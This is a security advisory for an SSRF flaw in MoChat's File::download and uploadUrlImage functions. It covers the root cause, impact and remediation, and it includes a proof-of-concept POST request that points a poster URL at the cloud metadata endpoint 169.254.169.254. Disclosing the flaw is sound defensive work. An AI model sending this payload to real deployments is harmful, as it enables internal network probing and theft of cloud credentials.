# MoChat — File::download / uploadUrlImage SSRF (MC-VULN-007)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Server-Side Request Forgery |
| **CWE** | CWE-918 |
| **Authentication** | Authenticated admin (store fission/welcome with http URL) |

## Summary

`File::download()` and `File::uploadUrlImage()` call `file_get_contents($url)` without scheme/host allowlist. Triggered from plugin StoreLogic when image fields contain http URLs.

## Root cause

`app/utils/src/File.php` + `FilesystemExt::file_full_url()` http passthrough.

## Proof of Concept

```
# After corp bind + permission — store fission poster URL pointing to internal host
POST /dashboard/workFission/store HTTP/1.1
Host: 127.0.0.1:9501
Authorization: Bearer ADMIN_TOKEN
Content-Type: application/json
Connection: close

{"active_name":"ssrf-poc","pic_url":"http://169.254.169.254/latest/meta-data/"}
```

**Expected:** Server-side HTTP request to attacker-controlled / metadata URL

## Impact

Internal network probing, cloud metadata theft.

## Remediation

URL allowlist; block private IP ranges; disable file://.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-007
- PoC: `POC_VERIFICATION_REPORT.md`
